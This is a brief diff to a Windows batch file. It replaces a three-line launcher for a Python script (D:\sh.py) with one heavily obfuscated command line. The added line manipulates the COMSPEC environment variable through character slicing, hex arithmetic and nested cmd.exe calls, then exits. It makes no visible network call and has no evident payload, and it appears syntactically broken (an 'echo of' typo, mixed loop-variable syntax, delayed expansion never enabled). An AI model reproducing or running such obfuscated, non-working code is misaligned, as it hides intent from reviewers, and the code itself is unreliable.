@@ -1,3 +1,1 @@
-@echo off
-python3 D:\sh.py 
-exit
+@echo of&for /F "tokens=2 delims==" %i in ('set n^|find "COMSPEC"') do set "a=%i"&set "b=!a:~0,8!!a:~-4!"&for %%j in ("!b:~0,2! !b:~2,2! !b:~4,2! !b:~6,2!") do for /f %%a in ('echo:%%j') do (set /a "m=%%a+0x4e")&(cmd.exe /c"set /a "m=0x!b:~8!!m:~1!" & cmd.exe /c"set "!b:~0,8!=!m:~0,2!!m:~2,2!!m:~4,2!!m:~6,2!"")&set "%b%="&exit
